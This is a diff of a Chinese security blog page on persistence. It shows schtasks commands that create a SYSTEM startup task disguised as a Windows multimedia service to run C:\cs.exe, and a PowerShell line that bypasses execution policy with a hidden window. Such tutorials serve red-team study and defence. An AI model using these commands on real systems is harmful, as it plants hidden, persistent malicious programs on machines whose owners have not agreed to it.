@@ -163,7 +163,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/权限维持" style="color: #ffa2c4">
+                <a href="/tags/权限维持" style="color: #03a9f4">
                     权限维持
                 </a>
             </span>
@@ -244,14 +244,16 @@ schtasks /?
 </tr>
 </tbody></table>
 <ul>
-<li>例子<br>&#96;&#96;&#96;bash<br>schtasks &#x2F;create &#x2F;ru system &#x2F;tn “Microsoft\Windows\Multimedia\SystemMediaService” &#x2F;sc ONSTART &#x2F;tr “C:\cs.exe” &#x2F;&#x2F; 创建⼀个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执⾏ c:\cs.exe 的计划任务，需要管理员权限</li>
+<li>例子</li>
 </ul>
-<p>schtasks &#x2F;change &#x2F;tn “Microsoft\Windows\Multimedia\SystemSoundsService” &#x2F;ru system &#x2F;tr “C:\cs.exe” &#x2F;enable &#x2F;&#x2F; 修改 Microsoft\Windows\Multimedia\SystemSoundsService 计划任务，需要管理员权限，更改任务⽆法通过 &#x2F;sc、&#x2F;mo 参数更改计划频率</p>
-<pre><code>
-- powershell执行
+<pre><code class="bash">schtasks /create /ru system /tn &quot;Microsoft\Windows\Multimedia\SystemMediaService&quot; /sc ONSTART /tr &quot;C:\cs.exe&quot; // 创建⼀个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执⾏ c:\cs.exe 的计划任务，需要管理员权限
 
-```bash
-# 有这两种，执行exe和执行ps1
+schtasks /change /tn &quot;Microsoft\Windows\Multimedia\SystemSoundsService&quot; /ru system /tr &quot;C:\cs.exe&quot; /enable // 修改 Microsoft\Windows\Multimedia\SystemSoundsService 计划任务，需要管理员权限，更改任务⽆法通过 /sc、/mo 参数更改计划频率
+</code></pre>
+<ul>
+<li>powershell执行</li>
+</ul>
+<pre><code class="bash"># 有这两种，执行exe和执行ps1
 # 执行exe
 powershell -ExecutionPolicy Bypass -windowstyle hidden -command &#39;notepad.exe&#39;
 # 切记-command的后面的参数一定是单引号括起来
